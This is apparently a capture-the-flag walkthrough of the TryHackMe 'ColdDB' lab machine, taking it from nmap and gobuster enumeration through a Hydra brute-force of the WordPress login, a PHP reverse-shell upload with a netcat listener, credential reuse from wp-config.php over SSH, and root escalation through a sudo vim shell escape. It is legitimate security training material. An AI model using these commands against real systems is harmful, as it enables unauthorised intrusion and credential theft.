# TryHackMe - ColdDB (Easy)

Detailed walkthrough of the "ColdDB" machine on TryHackMe.  
Objective: Gain root access by moving from web enumeration to privilege escalation via Vim.

---

## Overview

This machine simulates a typical web-to-root scenario. The goal is to exploit a vulnerable WordPress site to gain a foothold, extract credentials, access the system via SSH, and escalate privileges using a misconfigured `vim` binary.

---

 1. Port Scanning

Initial full TCP port scan:


nmap -p- -T5 10.10.158.121

Open ports found:

    80 

    4512 
---

Service/version detection:

nmap -p 80,4512 -sV -A 10.10.158.121 -o nmap.txt

p80 : (HTTP)

p4512: (SSH on a non-standard port)

---

2. Web Enumeration

Nothing obvious on the homepage. Using Gobuster:

gobuster dir -u http://10.10.158.121 -w /usr/share/wordlists/rockyou.txt

Discovered /Hidden, which contains a message:

    C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. – Philip

This reveals a potential valid username: C0ldd.

---

3. WordPress Login Brute Force

I first tested common credentials like admin:admin and admin:password — no success.

Trying the username C0ldd manually returned a WordPress error indicating that the password is incorrect, meaning the username is valid.

Brute-force attack with Hydra:

hydra -l C0ldd -P /usr/share/wordlists/rockyou.txt 10.10.158.121 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect" -V

Login successful. Access to the WordPress admin panel is now available at /wp-admin.

---

4. Uploading a Reverse Shell

From the WordPress admin panel, I uploaded a Pentestmonkey PHP reverse shell, disguised as a plugin.

However, it didn't appear in the usual plugins folder. After some digging, I found it uploaded here:

/wp-content/uploads/2025/05/shell.php

I started a Netcat listener:

nc -lvnp 4444

Triggering the URL launched the reverse shell successfully.

---

5. SSH Access & User Flag

From the initial shell, I tried reading /home/c0ldd/user.txt but lacked permission.

I searched the WordPress config file:

cat /var/www/html/wp-config.php

It contained database credentials — which also worked via SSH:

ssh -p 4512 c0ldd@10.10.158.121

After connecting, I was able to read the user flag:

cat /home/c0ldd/user.txt

It was Base64-encoded:

echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 --decode

→ Felicidades, primer nivel conseguido!

---

6.  Privilege Escalation

Checked sudo permissions:

sudo -l

Found that vim could be executed as root. Based on GTFOBins:

sudo vim -c ':!/bin/sh'

Confirmed root access with:

whoami
# root

---

7. Root Flag

Read the root flag:

cat /root/root.txt

It was also Base64-encoded:

echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 --decode

→ ¡Felicidades, máquina completada!

 ---
 
  Skills Demonstrated

   - Full-range port scanning with Nmap

   - Web directory fuzzing (Gobuster)

   - WordPress user enumeration & brute-force

   - Reverse shell upload via admin panel

   - Credential harvesting from wp-config.php

   - SSH login on custom port

   - Privilege escalation via sudo + GTFOBins

   - Base64 decoding of flags

